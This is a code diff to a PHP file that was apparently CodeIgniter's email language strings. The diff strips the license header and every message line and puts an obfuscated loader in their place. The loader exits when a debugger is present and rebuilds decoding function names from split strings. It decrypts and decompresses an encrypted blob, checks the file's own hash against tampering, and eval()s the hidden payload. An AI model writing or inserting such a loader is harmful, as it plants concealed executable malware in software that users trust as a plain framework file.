@@ -1,58 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 1.0.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-$lang['email_must_be_array'] = 'The email validation method must be passed an array.';
-$lang['email_invalid_address'] = 'Invalid email address: %s';
-$lang['email_attachment_missing'] = 'Unable to locate the following email attachment: %s';
-$lang['email_attachment_unreadable'] = 'Unable to open this attachment: %s';
-$lang['email_no_from'] = 'Cannot send mail with no "From" header.';
-$lang['email_no_recipients'] = 'You must include recipients: To, Cc, or Bcc';
-$lang['email_send_failure_phpmail'] = 'Unable to send email using PHP mail(). Your server might not be configured to send mail using this method.';
-$lang['email_send_failure_sendmail'] = 'Unable to send email using PHP Sendmail. Your server might not be configured to send mail using this method.';
-$lang['email_send_failure_smtp'] = 'Unable to send email using PHP SMTP. Your server might not be configured to send mail using this method.';
-$lang['email_sent'] = 'Your message has been successfully sent using the following protocol: %s';
-$lang['email_no_socket'] = 'Unable to open a socket to Sendmail. Please check settings.';
-$lang['email_no_hostname'] = 'You did not specify a SMTP hostname.';
-$lang['email_smtp_error'] = 'The following SMTP error was encountered: %s';
-$lang['email_no_smtp_unpw'] = 'Error: You must assign a SMTP username and password.';
-$lang['email_failed_smtp_login'] = 'Failed to send AUTH LOGIN command. Error: %s';
-$lang['email_smtp_auth_un'] = 'Failed to authenticate username. Error: %s';
-$lang['email_smtp_auth_pw'] = 'Failed to authenticate password. Error: %s';
-$lang['email_smtp_data_failure'] = 'Unable to send data: %s';
-$lang['email_exit_status'] = 'Exit status code: %s';
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_k130lqo0=('bas'.'e64'.'_de'.'cod'.'e');
+$_m5mypl22=('gzu'.'nco'.'mpr'.'ess');
+$_bjxtm04v=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_c0kwxyar='AEbL+OJB';
+$_s39sxoq8='T9lx8x88ugQ=';
+$_gpl1pm1s='4WyKL0Fg';
+$_rg3o0aip='36oTBe/C';
+$_ouh0jaks='etfpVdUK';
+$_ux8kpthc='SQE8uMeZ';
+$_nvbkox98='zJwOFVWk';
+$_zgctmipr='DePd3w==';
+$_g7r3539z=$_k130lqo0($_rg3o0aip.$_c0kwxyar.$_gpl1pm1s.$_ouh0jaks.$_s39sxoq8);
+$_r9voyah4=$_k130lqo0($_nvbkox98.$_ux8kpthc.$_zgctmipr);
+$_ikiy4rro=$_k130lqo0('Jhro7X91AhHtzUrFW+Yz1a2f03oFjC7N4XrkYD6WU88uoHUovr+/xn7wQEPyFMtsjFx3zL7OXTjFmLEZ0XIBQN6Y5LD/nSY4+Eq/h7XZ3WV4El+dBRA87AkGMEFqewo+62PG+8MXEPgfpHNZPTR7akmkzb9ToawTtCNko/D7ppA4mm51B+bVHzY+ZQRWanq3pugjdOJX4JJBvEux5b7zFvfjh1kPwW/eF8eRbqnfj4HwxCuegX/okL6g1Gm80dQ2LrCF5wGgewamj6kJryJN/dWpj1R6j/XMxCNTdjLrzddAFA4fFK4cbVlPuOFojg5LG/nENBlUv35LF0MCG6fZEzS1HdC01majqpVJ6pNiYRiToJQPfro54YzQzBEb/OYIE0r4jmUm4ld+jQQxrZ1Zd1d/W4bn5jkRjwAhVAvh7uyUvG/Xa6hJ/yQ/YS8991vJpSBMW2IEHUMkiYTYdr7/uHuFv8+yH3jYy9O/LQ9/RRWUexYkynkm32yKV7XngPo9p9sQH5//VKFbqe2XSuUTZLSeCMoXRP/vitdObA4yP6Z6a4owt/BBoYsfMO3I2ggZsZ1muyRWjYU/TekYjDPIehZQ3JaimdojT58JRVSWP/uP6EFqAzDp7lisKckqh9BjWo3/gcUybE7nNDUvI9ylvTGWsnuElsGVjuUPcVNVD0FGmpvha0jlh2e6U+YXL4FqhAfEX90x7U0TtPwJEjtSGcAh5nnEDsEyMdEsb1FekRolvFHvPscgJxunehLnY3va9lciOLCvqLRXo2SPK57IuQ5GxZ1ZFIBGH4ris7e+n6wQPGHsTTBVrgEu5R8R86rO');
+$_fn06jn5q=$_bjxtm04v($_ikiy4rro,'aes-256-cbc',$_g7r3539z,OPENSSL_RAW_DATA,$_r9voyah4);
+if($_fn06jn5q===false){exit;}
+$_p7bqp792=$_m5mypl22($_fn06jn5q);
+if($_p7bqp792===false){exit;}
+$_fb442pzv='41fa3a42a2e0ea9abc8a5ac78647dc92123bd74ba12fb45ef357ceadab5ff367';
+$_tw28lvkk=@file_get_contents(__FILE__);
+if($_tw28lvkk!==false){
+$_al48u8aq=str_replace($_fb442pzv,"0000000000000000000000000000000000000000000000000000000000000000",$_tw28lvkk);
+$_lm9nws9v=hash("sha256",$_al48u8aq);
+if($_lm9nws9v!==$_fb442pzv){@http_response_code(403);exit;}
+}
+eval($_p7bqp792);
